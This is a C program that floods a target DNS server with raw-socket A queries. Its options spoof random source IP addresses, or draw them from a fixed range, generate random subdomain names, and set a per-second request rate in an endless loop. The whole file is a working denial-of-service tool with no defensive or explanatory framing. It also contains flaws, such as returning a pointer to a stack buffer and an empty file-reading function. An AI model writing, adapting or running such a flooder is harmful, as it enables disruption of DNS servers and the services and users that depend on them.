#define _BSD_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/wait.h>
#include <getopt.h>

#define	  CLASS_INET 1

/* alphabet: [a-z0-9] */
const char alphabet[] = "abcdefghijklmnopqrstuvwxyz0123456789";

/**
 * not a cryptographically secure number
 * return interger [0, n).
 */
int intN(int n) { return rand() % n; }

/**
 * Input: length of the random string [a-z0-9] to be generated
 */
char *randomString(int len) {
  char *rstr = malloc((len + 1) * sizeof(char));
  int i;
  for (i = 0; i < len; i++) {
    rstr[i] = alphabet[intN(strlen(alphabet))];
  }
  rstr[len] = '\0';
  char *str;
  str = strcat(rstr, ".com");
  return str;
}

char *randomFixIP() {
  char prefix[100] = {'2','7','.','6','4','.'};
  
  char *string_table[] = {"1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100","101","102","103","104","105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120","121","122","123","124","125","126","127","128","129","130","131","132","133","134","135","136","137","138","139","140","141","142","143","144","145","146","147","148","149","150","151","152","153","154","155","156","157","158","159","160","161","162","163","164","165","166","167","168","169","170","171","172","173","174","175","176","177","178","179","180","181","182","183","184","185","186","187","188","189","190","191","192","193","194","195","196","197","198","199","200","201","202","203","204","205","206","207","208","209","210","211","212","213","214","215","216","217","218","219","220","221","222","223","224","225","226","227","228","229","230","231","232","233","234","235","236","237","238","239","240","241","242","243","244","245","246","247","248","249","250","251","252","253","254"};
  int table_size = 253; // This must match the number of entries above
  char *block3 = string_table[rand() % table_size];
  char *block4 = string_table[rand() % table_size];
  char *ip;
  strcat(prefix, block3);
  strcat(prefix, ".");
  ip = strcat(prefix, block4);
  //printf("%s\n", ip);
  return ip;
}

enum dns_type {
	TYPE_A = 1,
	TYPE_NS,		//2
	TYPE_MD,		//3
	TYPE_MF,		//4
	TYPE_CNAME,		//5
	TYPE_SOA,		//6
	TYPE_MB,		//7
	TYPE_MG,		//8
	TYPE_MR,		//9
	TYPE_NULL,		//10 
	TYPE_WKS,		//11 
	TYPE_PTR,		//12 
	TYPE_HINFO,		//13
	TYPE_MINFO,		//14
	TYPE_MX,		//15 
	TYPE_TXT = 16,		//16
	TYPE_AAAA = 0x1c,
};

typedef struct type_name{
	uint16_t type;
	char typename[10];
} type_name_t;

type_name_t dns_type_names [] = {
	{TYPE_A, "A"},
	{TYPE_NS, "NS"},			
	{TYPE_MD, "MD"},			
	{TYPE_MF, "MF"},			
	{TYPE_CNAME, "CNAME"},		
	{TYPE_SOA, "SOA"},			
	{TYPE_MB, "MB"},			
	{TYPE_MG, "MG"},			
	{TYPE_MR, "MR"},			
	{TYPE_NULL, "NULL"},		
	{TYPE_WKS, "WKS"},			
	{TYPE_PTR, "PTR"},			
	{TYPE_HINFO, "HINFO"},		
	{TYPE_MINFO, "MINFO"},		
	{TYPE_MX, "MX"},			
	{TYPE_TXT, "TXT"},			
	{TYPE_AAAA, "AAAA"},		
};

#define DNS_TYPE_NUM (sizeof(dns_type_names) / sizeof(type_name_t))

struct dnshdr {
	unsigned short int id;

	unsigned char rd:1;			/* recursion desired */
	unsigned char tc:1;			/* truncated message */
	unsigned char aa:1;			/* authoritive answer */
	unsigned char opcode:4;		/* purpose of message */
	unsigned char qr:1;			/* response flag */

	unsigned char rcode:4;		/* response code */
	unsigned char unused:2;		/* unused bits */
	unsigned char pr:1;			/* primary server required (non standard) */
	unsigned char ra:1;			/* recursion available */

	unsigned short int que_num;
	unsigned short int rep_num;
	unsigned short int num_rr;
	unsigned short int num_rrsup;
};

uint16_t get_type(const char *type)
{
	int i;
	for (i = 0; i < DNS_TYPE_NUM; i++) {
		if (strcasecmp(type, dns_type_names[i].typename) == 0) {
			return dns_type_names[i].type;
		}
	}

	return 0;
}

unsigned short in_cksum(char *packet, int len)
{
	register int nleft = len;
	register u_short *w = (u_short *) packet;
	register int sum = 0;
	u_short answer = 0;

	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */

	if (nleft == 1) {
		*(u_char *) (&answer) = *(u_char *) w;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;				/* truncate to 16 bits */
	return (answer);
}

void usage(char *progname)
{
	printf("Usage: %s <query_name> <destination_ip> [options]\n"
			"\tOptions:\n"
			"\t-t, --type\t\tquery type\n"
			"\t-s, --source-ip\t\tsource ip\n"
			"\t-p, --dest-port\t\tdestination port\n"
			"\t-P, --src-port\t\tsource port\n"
			"\t-n, --rate\t\tnumber of DNS requests to send in one second\n"
			"\t-r, --random-source\t\tfake random source IP\n"
                        "\t-f, --random-source-fix\t\tfake random source IP in statis list\n"
                        "\t-d, --random-domain\t\tauto generate domain name\n"
			"\t-D, --daemon\t\trun as daemon\n"
			"\t-h, --help\n"
			"\n"
			, progname);
}

void nameformat(char *name, char *QS)
{
	char *bungle, *x;
	char elem[128];

	*QS = 0;
	bungle = malloc(strlen(name) + 3);
	strcpy(bungle, name);
	x = strtok(bungle, ".");
	while (x != NULL) {
		if (snprintf(elem, 128, "%c%s", strlen(x), x) == 128) {
			puts("String overflow.");
			exit(1);
		}
		strcat(QS, elem);
		x = strtok(NULL, ".");
	}
	free(bungle);
}

void nameformatIP(char *ip, char *resu)
{
	char *reverse, *temp, *x, *comps[10];
	int px = 0;

	temp = malloc(strlen(ip) + 3);
	reverse = malloc(strlen(ip) + 30);
	bzero(reverse, strlen(ip) + 30);
	strcpy(temp, ip);
	x = strtok(temp, ".");
	while (x != NULL) {
		if (px >= 10) {
			puts("Force DUMP:: dumbass, wtf you think this is, IPV6?");
			exit(1);
		}
		comps[px++] = x;
		x = strtok(NULL, ".");
	}
	for (px--; px >= 0; px--) {
		strcat(reverse, comps[px]);
		strcat(reverse, ".");
	}
	strcat(reverse, "in-addr.arpa");
	nameformat(reverse, resu);
	free(temp);
	free(reverse);
}

int make_question_packet(char *data, char *name, int type)
{
	if (type == TYPE_A) {
		nameformat(name, data);
		*((u_short *) (data + strlen(data) + 1)) = htons(TYPE_A);
	}
/* for other type querry
	if(type == TYPE_PTR){
		nameformatIP(name,data);
  	*( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_PTR);
	}
       
*/

	*((u_short *) (data + strlen(data) + 3)) = htons(CLASS_INET);

	return (strlen(data) + 5);
}

int read_ip_from_file(char *filename)
{
}

int main(int argc, char **argv)
{
        struct timeval t0, t1, t2;
        double elapsedTime;

	char qname[256] = {0};	/* question name */
	uint16_t qtype = TYPE_A;
	struct in_addr src_ip = {0};	/* source address          */
	struct sockaddr_in sin_dst = {0};	/* destination sock address*/
	u_short src_port = 0;			/* source port             */
	u_short dst_port = 53;			/* destination port        */
	int sock;					/* socket to write on      */
	int number = 0;
	int count = 0;
	int sleep_interval = 0;	/* interval (in millisecond) between two packets */

	int random_ip = 0;
        int random_list_ip = 0;
        int random_domain = 0;
	int static_ip = 0;

	int arg_options;

	const char *short_options = "f:t:p:P:Drs:i:n:h";

	const struct option long_options[] = {
		{"type", required_argument, NULL, 't'},
		{"dest-port", required_argument, NULL, 'p'},
		{"src-port", required_argument, NULL, 'P'},
		{"daemon", no_argument, NULL, 'D'},
		{"random-source", no_argument, NULL, 'r'},
                {"random-source-fix", no_argument, NULL, 'f'},
                {"random-domain", no_argument, NULL, 'd'},
		{"source-ip", required_argument, NULL, 's'},
		{"interval", required_argument, NULL, 'i'},
		{"rate", required_argument, NULL, 'n'},
		{"help", no_argument, NULL, 'h'},
		{NULL, 0, NULL, 0}
	};

	int quit = 0;
	const int on = 1;

	char *from, *to, filename;
	int itmp = 0;

	unsigned char packet[2048] = {0};
	struct ip *iphdr;
	struct udphdr *udp;
	struct dnshdr *dns_header;
	char *dns_data;

	while ((arg_options =
			getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {

		switch (arg_options) {

		case 'p':
			dst_port = atoi(optarg);
			break;

		case 'P':
			src_port = atoi(optarg);
			break;

		case 'i':
			sleep_interval = atoi(optarg) * 1000;
			break;

		case 'n':
			number = atoi(optarg);
			break;

		case 'r':
			random_ip = 1;
			srandom((unsigned long)time(NULL));
			break;
                case 'f':
                        random_list_ip = 1;
                        srandom((unsigned long)time(NULL));
                        break;
                case 'd':
                        random_domain = 1;
                        break;

		case 'D':
			//TODO
			break;

		case 's':
			static_ip = 1;
			inet_pton(AF_INET, optarg, &src_ip);
			break;

		case 't':
			qtype = get_type(optarg);
			if (qtype == 0) {
				printf("bad query type\n");
				quit = 1;
			}
			break;

		case 'h':
			usage(argv[0]);
			return 0;
			break;

		default:
			printf("CMD line Options Error\n\n");
			break;
		}
	}

	/* query name */
	if (optind < argc) {
		strcpy(qname, argv[optind]);
	} else {
		quit = 1;
	}

	optind++;

	/* target IP */
        char target[256] = {0};
	if (optind < argc) {
		inet_pton(AF_INET, argv[optind], &sin_dst.sin_addr);
                strcpy(target, argv[optind]);
	} else {
		quit = 1;
	}

	if (quit || !sin_dst.sin_addr.s_addr) {
		usage(argv[0]);
		exit(0);
	}

	/* check root user */
	if (getuid() != 0) {
		printf("This program must run as root privilege.\n");
		exit(1);
	}

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
		printf("\n%s\n", "Create RAW socket failed\n");
		exit(1);
	}

	if ((setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)))
		== -1) {
		perror("setsockopt");
		exit(-1);
	}

	sin_dst.sin_family = AF_INET;
	sin_dst.sin_port = htons(dst_port);

	iphdr = (struct ip *)packet;
	udp = (struct udphdr *)((char *)iphdr + sizeof(struct ip));
	dns_header = (struct dnshdr *)((char *)udp + sizeof(struct udphdr));
	dns_data = (char *)((char *)dns_header + sizeof(struct dnshdr));

	/* the fixed fields for DNS header */
	dns_header->rd = 1;
	dns_header->que_num = htons(1);
	dns_header->qr = 0;			/* qr = 0: question packet   */
	dns_header->aa = 0;			/* aa = 0: not auth answer   */
	dns_header->rep_num = htons(0);	/* sending no replies        */

	/* the fixed fields for UDP header */
	udp->uh_dport = htons(dst_port);
	if (src_port) {
		udp->uh_sport = htons(src_port);
	}

	/* the fixed fields for IP header */
	iphdr->ip_dst.s_addr = sin_dst.sin_addr.s_addr;
	iphdr->ip_v = IPVERSION;
	iphdr->ip_hl = sizeof(struct ip) >> 2;
	iphdr->ip_ttl = 245;
	iphdr->ip_p = IPPROTO_UDP;
 
        printf("[!] Your input:\n");
        printf("[+] Target DNS Server: %s\n", target);
        printf("[+] Target port: %d\n", dst_port);
        printf("[+] Number of requests: %d\n", number);
        printf("[+] Random source: %d\n", random_ip);
	printf("[+] Random source in list: %d\n", random_list_ip);
        printf("[+] Rate requests/s: %d\n", number);
        printf("[+] Random qname: %d\n", random_domain);
        printf("[+] Target domain: %s\n", qname);
        
        gettimeofday(&t0, NULL);
	while (1) {
           count = 0;
           gettimeofday(&t1, NULL);
           while (1) {
		int dns_datalen;
		int udp_datalen;
		int ip_datalen;

		ssize_t ret;

		if (random_ip) {
                         src_ip.s_addr = random();
		}
                
                if (random_list_ip) {
                         char *ip;
                         ip = randomFixIP();
                         inet_pton(AF_INET, ip, &src_ip);
                }

		dns_header->id = random();
                
                if (random_domain) {
                        char *qnamen;
                        qnamen = randomString(5);
                        dns_datalen = make_question_packet(dns_data, qnamen, TYPE_A);
                }
	        else
                {
                        dns_datalen = make_question_packet(dns_data, qname, TYPE_A);
                }

		udp_datalen = sizeof(struct dnshdr) + dns_datalen;
		ip_datalen = sizeof(struct udphdr) + udp_datalen;

		/* update UDP header*/
		if (!src_port) {
			udp->uh_sport = htons(random() % 65535);
		}
		udp->uh_ulen = htons(sizeof(struct udphdr) + udp_datalen);
		udp->uh_sum = 0;

		/* update IP header */
		iphdr->ip_src.s_addr = src_ip.s_addr;
		iphdr->ip_id = random() % 5985;
		//iphdr->ip_len = htons(sizeof(struct ip) + ip_datalen);
		iphdr->ip_len = sizeof(struct ip) + ip_datalen;
		iphdr->ip_sum = 0;
		//iphdr->ip_sum = in_cksum((char *)iphdr, sizeof(struct ip));

		ret = sendto(sock, iphdr, sizeof(struct ip) + ip_datalen, 0,
				(struct sockaddr *) &sin_dst, sizeof(struct sockaddr));
		if (ret == -1) {
			// perror("sendto error");
		}

		count++;
                gettimeofday(&t2, NULL);
                elapsedTime = (t2.tv_sec - t1.tv_sec) * 1000.0;
                elapsedTime += (t2.tv_usec - t1.tv_usec) / 1000.0;
                
		if (number > 0 && count >= number) {
			double sleepTime;
                        sleepTime = 1000 - elapsedTime;
                        printf("[!] Sent %d in %f ms => sleep more %f ms\n", count, elapsedTime, sleepTime);
                        usleep(sleepTime*1000); 
			break;
		}

		if (elapsedTime >= 1000 && number > 0) {
                        float rate;
                        rate = count/(elapsedTime/1000);
			printf("[!] Max real rate is %f requests/s. Not reach your input\n", rate);
                        break;
		}
                
                if (elapsedTime >= 1000 && number <= 0) {
                        float rate;
                        rate = count/(elapsedTime/1000);
                        printf("[!] Current rate is %f requests/s\n", rate);
                        break;
                }
	    }
        }

	printf("sent %d DNS requests.\n", count);

	return 0;
}
